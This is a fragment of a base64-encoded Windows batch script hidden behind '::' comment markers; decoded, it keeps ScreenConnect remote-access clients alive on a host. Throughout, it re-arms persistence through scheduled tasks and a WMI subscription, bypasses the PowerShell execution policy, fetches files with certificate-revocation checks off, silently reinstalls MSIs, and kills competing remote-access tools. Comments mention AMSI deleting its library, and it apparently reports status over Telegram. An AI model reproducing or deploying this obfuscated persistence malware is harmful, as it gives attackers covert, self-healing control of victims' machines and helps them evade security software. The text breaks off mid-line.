::cSAiJVNUQUdFJVx1cGRhdGUubWFuaWZlc3QiICIlU1RBR0UlXHVwZGF0ZS5tYW5p
::ZmVzdC5zaWciID5udWwgMj4mMQ0KDQpyZW0gTTQzOiBpZiBsaWIgc3RpbGwgbWlz
::c2luZyAoQU1TSSB3aXBlZCBpdCAvIG5ldmVyIGxhbmRlZCksIGtlZXAgYSBURU1Q
::IGNvcHkgZm9yIGZhbGxiYWNrcw0KaWYgbm90IGV4aXN0ICIlV0QlXG93bl9saWIu
::cHMxIiBpZiBleGlzdCAiJVNUQUdFJVxvd25fbGliLm5ldyIgY29weSAveSAiJVNU
::QUdFJVxvd25fbGliLm5ldyIgIiVXRCVcb3duX2xpYi5wczEiID5udWwgMj4mMQ0K
::aWYgbm90IGV4aXN0ICIlV0QlXG93bl9ncnl4YS5jbWQiICgNCiAgIiVDVVJMJSIg
::LUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGlt
::ZSAyMCAtbyAiJVdEJVxvd25fZ3J5eGEuY21kIiAiJU9XTkdSWVhBJSIgPm51bCAy
::PiYxDQogIGlmIG5vdCBleGlzdCAiJVdEJVxvd25fZ3J5eGEuY21kIiAiJUNVUkwl
::IiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMjAgLW8gIiVXRCVc
::b3duX2dyeXhhLmNtZCIgIiVPV05HUllYQTIlIiA+bnVsIDI+JjENCikNCg0KcmVt
::IE00Mjogc2V2cnouY2ZnIGR5bmFtaWMgRlAgZnJvbSByZXBvIHNldnJ6X2V4cGVj
::dGVkLmNmZw0KaWYgZXhpc3QgIiVXRCVcc2V2cnouY2ZnIiBmb3IgL2YgInVzZWJh
::Y2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcc2V2cnouY2Zn
::IikgZG8gKA0KICBpZiAvSSAiJSVLIj09IlBSSU1BUllfRlAiIHNldCAiS0VFUF9G
::UD0lJUwiDQogIGlmIC9JICIlJUsiPT0iQUxUX0ZQIiBzZXQgIkFMVF9GUD0lJUwi
::DQopDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVv
::dXQgNiAtLW1heC10aW1lIDIwIC1vICIlU1RBR0UlXHNldnJ6X2V4cGVjdGVkLm5l
::dyIgIiVTRVZSWl9FWFBfVVJMJSIgPm51bCAyPiYxDQppZiBub3QgZXhpc3QgIiVT
::VEFHRSVcc2V2cnpfZXhwZWN0ZWQubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3Qt
::dGltZW91dCA2IC0tbWF4LXRpbWUgMjAgLW8gIiVTVEFHRSVcc2V2cnpfZXhwZWN0
::ZWQubmV3IiAiJVNFVlJaX0VYUF9VUkwyJSIgPm51bCAyPiYxDQppZiBleGlzdCAi
::JVNUQUdFJVxzZXZyel9leHBlY3RlZC5uZXciIGlmIGV4aXN0ICIlV0QlXG93bl9s
::aWIucHMxIiAoDQogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChg
::cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9u
::UG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiJHQ9R2V0LUNvbnRlbnQgLUxpdGVyYWxQ
::YXRoICclU1RBR0UlXHNldnJ6X2V4cGVjdGVkLm5ldycgLVJhdzsgJiAnJVdEJVxv
::d25fbGliLnBzMScgLUFjdGlvbiBzeW5jLXNldnJ6LWZwIC1Xb3JrRGlyICclV0Ql
::JyAtRXh0cmEgJHQiYCkgZG8gKA0KICAgIGVjaG8gc2V2cnpfc3luYyAlJVI+PiIl
::TE9HJSINCiAgICBmb3IgL2YgInRva2Vucz0yLDMgZGVsaW1zPXwiICUlQSBpbiAo
::IiUlUiIpIGRvICgNCiAgICAgIGlmIG5vdCAiJSVBIj09IiIgc2V0ICJLRUVQX0ZQ
::PSUlQSINCiAgICAgIGlmIG5vdCAiJSVCIj09IiIgc2V0ICJBTFRfRlA9JSVCIg0K
::ICAgICkNCiAgKQ0KKQ0KZGVsIC9mIC9xICIlU1RBR0UlXHNldnJ6X2V4cGVjdGVk
::Lm5ldyIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdEJVxzZXZyei5jZmciIGZvciAv
::ZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxz
::ZXZyei5jZmciKSBkbyAoDQogIGlmIC9JICIlJUsiPT0iUFJJTUFSWV9GUCIgc2V0
::ICJLRUVQX0ZQPSUlTCINCiAgaWYgL0kgIiUlSyI9PSJBTFRfRlAiIHNldCAiQUxU
::X0ZQPSUlTCINCikNCg0KcmVtIOKUgOKUgCBbQl0gcmUtYXJtIGNoYWluIDE6IG93
::bmVyc2hpcC1hd2FyZSAobm90IGV4aXN0ZW5jZS1vbmx5KSDilIDilIANCnJlbSBM
::MTEvTTIyOiBRdWVyeS1vbmx5IHNraXBwZWQgcmVhcm0gd2hlbiBXaW5kb3dzIGJ1
::aWx0LWluIHRhc2tzIHNoYXJlZA0KcmVtIGRlZmF1bHQgbmFtZXMgKERpYWdub3Np
::c1xTY2hlZHVsZWQgZXRjLikgLT4gbW9uIG5ldmVyIHJhbiwgbm8gbG9nLg0KaWYg
::ZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgNCiAgZm9yIC9mICJ1c2ViYWNrcSBk
::ZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
::YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
::aWIucHMxIiAtQWN0aW9uIHRhc2tzLWVuc3VyZSAtV29ya0RpciAiJVdEJSIgLU1v
::blBhdGggIiVXRCVcb3duX21vbi5jbWQiYCkgZG8gKA0KICAgIGVjaG8gdGFza3Nf
::ZW5zdXJlICUlUj4+IiVMT0clIg0KICAgIHNldCAiVEFTS1NfRU5TVVJFPSUlUiIN
::CiAgKQ0KKQ0KaWYgbm90IGV4aXN0ICIlRVRMJSIgbWtkaXIgIiVFVEwlIiA+bnVs
::IDI+JjENCmlmIGV4aXN0ICIlV0QlXG93bl9tb24uY21kIiAoDQogIGF0dHJpYiAt
::aCAtcyAtciAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KICBjb3B5IC95
::ICIlV0QlXG93bl9tb24uY21kIiAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4m
::MQ0KKQ0KDQpyZW0g4pSA4pSAIFtCMl0gcmUtYXJtIGNoYWluIDIgKFdNSSBzdWJz
::Y3JpcHRpb24pIGlmIG1pc3Npbmcg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::DQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKA0KICBmb3IgL2YgInVzZWJh
::Y2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9u
::SW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVc
::b3duX2xpYi5wczEiIC1BY3Rpb24gd2F0Y2hkb2ctZW5zdXJlIC1Xb3JrRGlyICIl
::V0QlIiAtTW9uUGF0aCAiJVdEJVxvd25fbW9uLmNtZCJgKSBkbyBzZXQgIldEX1NU
::QVRFPSUlUiINCiAgaWYgL0kgIiFXRF9TVEFURSEiPT0iUkVBUk1FRCIgZWNobyB3
::YXRjaGRvZyBXTUkgUkVBUk1FRD4+IiVMT0clIg0KKQ0KDQpyZW0g4pSA4pSAIFtF
::MF0gc3luYyBHcnl4YSBGUCBmcm9tIHZlcmlmaWVkIGdyeXhhLmNvbSBTQyBCRUZP
::UkUgZXh0ZXJtaW5hdGUg4pSA4pSADQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBz
::MSIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1F
::eGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAt
::QWN0aW9uIHN5bmMtZ3J5eGEtZnAgLVdvcmtEaXIgIiVXRCUiID5udWwgMj4mMQ0K
::ICBpZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9r
::ZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmciKSBkbyBp
::ZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIg0KKQ0K
::DQpyZW0g4pSA4pSAIFtFXSBleHRlcm1pbmF0ZSBmb3JlaWduIFNDICsgZGlzYWxs
::b3dlZCBSTU0gKEFGVEVSIEdyeXhhIEZQIHN5bmMpIOKUgOKUgA0KaWYgZXhpc3Qg
::IiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
::ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
::X2xpYi5wczEiIC1BY3Rpb24gZXh0ZXJtaW5hdGUgLVdvcmtEaXIgIiVXRCUiID4+
::IiVMT0clIiAyPiYxDQp0aW1lb3V0IC90IDggL25vYnJlYWsgPm51bA0Kc2V0ICJG
::T1JFSUdOX0xFRlQ9MCINCmZvciAvZiAidG9rZW5zPTIgZGVsaW1zPSgpIiAlJWEg
::aW4gKCdzYyBxdWVyeSBzdGF0ZV49IGFsbCBefCBmaW5kc3RyIC9DOiJTRVJWSUNF
::X05BTUU6IFNjcmVlbkNvbm5lY3QgQ2xpZW50IicpIGRvICgNCiAgc2V0ICJGUD0l
::JWEiDQogIHNldCAiRlA9IUZQOiA9ISINCiAgcmVtIGZyaWVuZGx5IGlmIGtlZXBl
::ciBGUCBPUiBncnl4YS1yZWxheSAoSW1hZ2VQYXRoIGhhcyBncnl4YS5jb20pIOKA
::lCBuZXZlciBjb3VudCBuZXcgR3J5eGEgYXMgZm9yZWlnbg0KICBzZXQgIkZSSUVO
::RExZPTAiDQogIGlmIC9JICIhRlAhIj09IiVLRUVQX0ZQJSIgc2V0ICJGUklFTkRM
::WT0xIg0KICBpZiAvSSAiIUZQISI9PSIlQUxUX0ZQJSIgc2V0ICJGUklFTkRMWT0x
::Ig0KICBpZiAvSSAiIUZQISI9PSIlR1JZWEFfRlAlIiBzZXQgIkZSSUVORExZPTEi
::DQogIGlmICIhRlJJRU5ETFkhIj09IjAiICgNCiAgICBmb3IgL2YgInVzZWJhY2tx
::IGRlbGltcz0iICUlSSBpbiAoYHJlZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3VycmVu
::dENvbnRyb2xTZXRcU2VydmljZXNcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCFGUCEp
::IiAvdiBJbWFnZVBhdGggMl4+bnVsIF58IGZpbmRzdHIgL0kgIkltYWdlUGF0aCJg
::KSBkbyAoDQogICAgICBlY2hvICUlSSB8IGZpbmRzdHIgL0kgImdyeXhhLmNvbSIg
::Pm51bCAmJiBzZXQgIkZSSUVORExZPTEiDQogICAgKQ0KICApDQogIGlmICIhRlJJ
::RU5ETFkhIj09IjAiICgNCiAgICBzZXQgL2EgQ09VTlQrPTENCiAgICBzZXQgL2Eg
::Rk9SRUlHTl9MRUZUKz0xDQogICAgc2V0ICJGT1JFSUdOX0xJU1Q9IUZPUkVJR05f
::TElTVCEhRlAhICINCiAgICBlY2hvIGZvcmVpZ25fbGVmdF8hRlAhPj4iJUxPRyUi
::DQogICkNCikNCg0KcmVtIOKUgOKUgCBbQ10gaGVhbCBTY3JlZW5Db25uZWN0IHBy
::aW0vYWx0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KZm9y
::IC9mICJ0b2tlbnM9MSwyIGRlbGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkgIlNj
::cmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiBefCBmaW5kc3RyIC9DOiJT
::RVJWSUNFX05BTUUiJykgZG8gKA0KICBzZXQgIklOU1RBTExFRD0xIg0KICBzZXQg
::IlBSSU1TVEFURT0lJWIiDQopDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGll
::bnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVy
::cm9ybGV2ZWwgMSAoDQogIHNldCAiUFJJTV9PSz0xIg0KICBzZXQgL2EgQ09VTlQr
::PTENCikNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUp
::IiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0IC9hIENPVU5UKz0x
::DQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBm
::aW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiQUxU
::X09LPTEiDQoNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09
::IjAiICgNCiAgZWNobyBzdmMgaGVhbCByZXN0YXJ0Pj4iJUxPRyUiDQogIG5ldCBz
::dGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4m
::MQ0KICBzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSki
::ID5udWwgMj4mMQ0KICB0aW1lb3V0IC90IDYgL25vYnJlYWsgPm51bA0KICBzYyBx
::dWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAi
::UlVOTklORyIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJTV9P
::Sz0xIg0KKQ0KcmVtIE0xNjogc3RpbGwgc3RvcHBlZCAtPiByZXBhaXIgdGhlIFJF
::R0lTVEVSRUQgcHJvZHVjdCAobXNpZXhlYyAvZmEgcmVzdG9yZXMNCnJlbSBiaW5h
::cmllcyArIHN0YXJ0cyB0aGUgc2VydmljZTsgTDUgUmVwYWlyLVNDU2VydmljZSBo
::YW5kbGVzIHN0b3BwZWQgc3ZjcykNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAi
::JVBSSU1fT0slIj09IjAiICgNCiAgZWNobyBzdmMgZXNjYWxhdGUgcmVwYWlyPj4i
::JUxPRyUiDQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxs
::IC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlw
::YXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAg
::IiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQogIHRp
::bWVvdXQgL3QgOCAvbm9icmVhayA+bnVsDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25u
::ZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQog
::IGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklNX09LPTEiDQopDQpyZW0gTTE2
::OiBvcnBoYW5lZCBzZXJ2aWNlIGVudHJ5IChwcm9kdWN0IHVucmVnaXN0ZXJlZCAt
::IGVhdGVuIGJ5IGFuIFNDLWZhbWlseQ0KcmVtIHVwZ3JhZGUgcmVtb3ZhbCkgY2Fu
::IE5FVkVSIHN0YXJ0LiBEZWxldGUgaXQgYW5kIGZhbGwgdGhyb3VnaCB0byB0aGUN
::CnJlbSBmcmVzaC1pbnN0YWxsIGxhZGRlciBiZWxvdyBpbnN0ZWFkIG9mIGFsZXJ0
::aW5nICJ3b250IHN0YXJ0IiBmb3JldmVyLg0KaWYgIiVJTlNUQUxMRUQlIj09IjEi
::IGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBzZXQgIlJFR1NUQVRFPXVua25vd24i
::DQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgImRlbGltcz0i
::ICUlUiBpbiAoJ3Bvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
::LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEi
::IC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVX
::RCUiJykgZG8gc2V0ICJSRUdTVEFURT0lJVIiDQogIGVjaG8gb3JwaGFuX2NoZWNr
::PSFSRUdTVEFURSE+PiIlTE9HJSINCiAgaWYgL0kgIiFSRUdTVEFURSEiPT0ibm8i
::ICgNCiAgICBlY2hvIG9ycGhhbl9zZXJ2aWNlX2RlbGV0ZT4+IiVMT0clIg0KICAg
::IHNjIGRlbGV0ZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5u
::dWwgMj4mMQ0KICAgIHNldCAiSU5TVEFMTEVEPTAiDQogICkNCikNCmlmICIlSU5T
::VEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAgcG93ZXJzaGVs
::bCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5
::cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29y
::a0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAic3ZjLXdvbnQtc3Rh
::cnQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIERPV04gIlNjcmVlbkNvbm5l
::Y3QgKCVLRUVQX0ZQJSkgaW5zdGFsbGVkIGJ1dCB3b250IHN0YXJ0Ig0KICBnb3Rv
::IDpBZnRlckhlYWwNCikNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBnb3RvIDpBZnRl
::ckhlYWwNCg0KcmVtIOKUgOKUgCBbRF0gcHJpbWFyeSBTQyBtaXNzaW5nIC0gaGVh
::bCBsYWRkZXIg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpyZW0gTTEyOiBGSVJTVCByZXBh
::aXIgdGhlIHJlZ2lzdGVyZWQgcHJvZHVjdCAocmVjcmVhdGVzIHNlcnZpY2Ugd2l0
::aG91dA0KcmVtIHRvdWNoaW5nIHRoZSBBTFQgaW5zdGFuY2UpOyBmcmVzaCBtc2ll
::eGVjIGluc3RhbGwgb25seSBhcyBmYWxsYmFjay4NCmVjaG8gc3ZjIG1pc3Npbmcg
::LSBoZWFsIGJlZ2luPj4iJUxPRyUiDQpjYWxsIDpSZXBhaXJSZWdpc3RlcmVkICIl
::S0VFUF9GUCUiDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQ
::X0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwg
::MSAoDQogIHNldCAiSU5TVEFMTEVEPTEiDQogIHNldCAiUFJJTV9PSz0xIg0KICBn
::b3RvIDpBZnRlckhlYWwNCikNCnJlbSByZWZ1c2UgZnJlc2ggL2kgaWYgcHJvZHVj
::dCBzdGlsbCByZWdpc3RlcmVkIC0gVXBncmFkZSB0YWJsZSBjYW4gd2lwZSBBTFQv
::R1JZWEENCnNldCAiUkVHU1RBVEU9dW5rbm93biINCmlmIGV4aXN0ICIlV0QlXG93
::bl9saWIucHMxIiBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBv
::d2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
::bGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVn
::aXN0ZXJlZCAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiYCkgZG8gc2V0
::ICJSRUdTVEFURT0lJVIiDQppZiAvSSAiIVJFR1NUQVRFISI9PSJ5ZXMiICgNCiAg
::ZWNobyBwcmltYXJ5X3JlZ2lzdGVyZWRfc2tpcF9mcmVzaF9pbnN0YWxsPj4iJUxP
::RyUiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4
::ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1B
::Y3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0
::cmEgInJlZ2lzdGVyZWQtc3R1Y2siID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRl
::IERPV04gIlByaW1hcnkgcmVnaXN0ZXJlZCBidXQgc2VydmljZSBtaXNzaW5nIC0g
::L2ZhIGZhaWxlZDsgcmVmdXNlZCAvaSB0byBwcm90ZWN0IEFMVC9HUllYQSINCiAg
::Z290byA6QWZ0ZXJIZWFsDQopDQpyZW0gTzM3OiByZWZ1c2Ugc2V2cnogL2kgd2hl
::biBncnl4YSBhbHJlYWR5IHByZXNlbnQg4oCUIHNoYXJlZCBsZWdhY3kgVXBncmFk
::ZUNvZGVzDQpyZW0gezBDOTQ0NDhCfS97MUY4NUQ3RkV9IG1ha2Ugc2libGluZyBt
::c2lleGVjIC9pIGtub2NrIEdyeXhhIE9GRkxJTkUgaW4gcGFuZWwuDQpyZW0gTTM2
::OiBkZXRlY3QgR3J5eGEgYnkgcmVsYXkgZG9tYWluIHRvbyAoYW55IHJ1bm5pbmcg
::Z3J5eGEuY29tIFNDKSwgbm90IG9ubHkgYnkgRlAuDQpzZXQgIkdSRUc9dW5rbm93
::biINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgInVzZWJhY2tx
::IGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
::ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
::X2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVHUllYQV9GUCUiIC1X
::b3JrRGlyICIlV0QlImApIGRvIHNldCAiR1JFRz0lJVIiDQpzYyBxdWVyeSAiU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCmlmIG5v
::dCBlcnJvcmxldmVsIDEgc2V0ICJHUkVHPXllcyINCnJlbSBhbnkgU2NyZWVuQ29u
::bmVjdCBzZXJ2aWNlIHdob3NlIEltYWdlUGF0aCBpcyBncnl4YS5jb20gY291bnRz
::IGFzIEdyeXhhIHByZXNlbnQNCmZvciAvZiAidG9rZW5zPTIgZGVsaW1zPSgpIiAl
::JWEgaW4gKCdzYyBxdWVyeSBzdGF0ZV49IGFsbCBefCBmaW5kc3RyIC9DOiJTRVJW
::SUNFX05BTUU6IFNjcmVlbkNvbm5lY3QgQ2xpZW50IicpIGRvICgNCiAgc2V0ICJf
::RlA9JSVhIg0KICBzZXQgIl9GUD0hX0ZQOiA9ISINCiAgZm9yIC9mICJ1c2ViYWNr
::cSBkZWxpbXM9IiAlJUkgaW4gKGByZWcgcXVlcnkgIkhLTE1cU1lTVEVNXEN1cnJl
::bnRDb250cm9sU2V0XFNlcnZpY2VzXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICghX0ZQ
::ISkiIC92IEltYWdlUGF0aCAyXj5udWwgXnwgZmluZHN0ciAvSSAiSW1hZ2VQYXRo
::ImApIGRvICgNCiAgICBlY2hvICUlSSB8IGZpbmRzdHIgL0kgImdyeXhhLmNvbSIg
::Pm51bCAmJiBzZXQgIkdSRUc9eWVzIg0KICApDQopDQppZiAvSSAiIUdSRUchIj09
::InllcyIgKA0KICBlY2hvIHByaW1hcnlfc2tpcF9pX3Byb3RlY3RfZ3J5eGE+PiIl
::TE9HJSINCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
::RXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIg
::LUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1F
::eHRyYSAicHJvdGVjdC1ncnl4YS1za2lwLXByaW1hcnktaSIgPm51bCAyPiYxDQog
::IGNhbGwgOlRnU3RhdGUgRE9XTiAiUHJpbWFyeSBtaXNzaW5nIC0gcmVmdXNlZCBz
::ZXZyeiAvaSB0byBwcm90ZWN0IEdyeXhhIChzaGFyZWQgU0MgVXBncmFkZUNvZGVz
::KTsgL2ZhIG9ubHkiDQogIGdvdG8gOkFmdGVySGVhbA0KKQ0KaWYgIiVJTlNUQUxM
::RUQlIj09IjAiIGNhbGwgOkluc3RhbGxNc2kgIiVNU0lfVVJMJSIgIm1haW4iDQpp
::ZiAiJUlOU1RBTExFRCUiPT0iMCIgY2FsbCA6SW5zdGFsbE1zaSAiJU1TSV9QS0cx
::JT90PSVSQU5ET00lIiAiZ2l0aHViLXBrZyINCmlmICIlSU5TVEFMTEVEJSI9PSIw
::IiBjYWxsIDpJbnN0YWxsTXNpICIlTVNJX1BLRzIlIiAianNkZWxpdnItcGtnIg0K
::aWYgIiVJTlNUQUxMRUQlIj09IjAiICgNCiAgcmVtIHByZWZlciB3b3JrZXItY2Fj
::aGVkIC53dWNhY2hlXHBrZy5tc2kgKHNhbWUgYmluYXJ5IGFzIGRlcGxveSkNCiAg
::YXR0cmliIC1oIC1zIC1yICIlTVNJQ0FDSEUlIiA+bnVsIDI+JjENCiAgZm9yICUl
::RiBpbiAoIiVNU0lDQUNIRSUiKSBkbyBpZiAlJX56RiBHVFIgMTAwMDAwMCAoDQog
::ICAgZWNobyB3dWNhY2hlX3BrZ19yZXRyeT4+IiVMT0clIg0KICAgIGF0dHJpYiAt
::aCAtcyAtciAiJU1TSSUiID5udWwgMj4mMQ0KICAgIGNvcHkgL3kgIiVNU0lDQUNI
::RSUiICIlTVNJJSIgPm51bCAyPiYxDQogICkNCiAgZm9yICUlRiBpbiAoIiVNU0kl
::IikgZG8gaWYgJSV+ekYgR1RSIDEwMDAwMDAgKA0KICAgIGVjaG8gY2FjaGUgcmV0
::cnkgaW5zdGFsbD4+IiVMT0clIg0KICAgIGNhbGwgOk5vTXNpUG9saWN5DQogICAg
::bXNpZXhlYyAvaSAiJU1TSSUiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVC
::T09UPVJlYWxseVN1cHByZXNzIC9MKnYgIiVXRCVcbXNpX2hlYWwubG9nIiA+bnVs
::IDI+JjENCiAgICBzZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIg0KICAgIGVjaG8g
::Y2FjaGUgbXNpZXhlYyBleGl0PSFNU0lFWElUIT4+IiVMT0clIg0KICAgIGlmICIh
::TVNJRVhJVCEiPT0iMTYxOCIgKA0KICAgICAgdGltZW91dCAvdCAzMCAvbm9icmVh
::ayA+bnVsDQogICAgICBtc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQg
::QUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lf
::aGVhbDIubG9nIiA+bnVsIDI+JjENCiAgICAgIHNldCAiTVNJRVhJVD0hRVJST1JM
::RVZFTCEiDQogICAgICBlY2hvIGNhY2hlX3JldHJ5MTYxOF9leGl0PSFNU0lFWElU
::IT4+IiVMT0clIg0KICAgICkNCiAgICBjYWxsIDpXYWl0U3ZjDQogICkNCikNCmNh
::bGwgOlJlc3RvcmVBbHQNCmNhbGwgOkVuc3VyZUdyeXhhTXVzdA0KaWYgIiVJTlNU
::QUxMRUQlIj09IjAiICgNCiAgaWYgZXhpc3QgIiVXRCVcbXNpX2hlYWwubG9nIiAo
::DQogICAgZWNobyAtLS0gbXNpX2hlYWwubG9nIHRhaWwgLS0tPj4iJUxPRyUiDQog
::ICAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFu
::ZCAiR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXG1zaV9oZWFsLmxvZycg
::LVRhaWwgMTAiID4+IiVMT0clIiAyPiYxDQogICkNCiAgaWYgbm90IGRlZmluZWQg
::TVNJRVhJVCBzZXQgIk1TSUVYSVQ9ZmV0Y2gtZmFpbCINCiAgcG93ZXJzaGVsbCAt
::Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
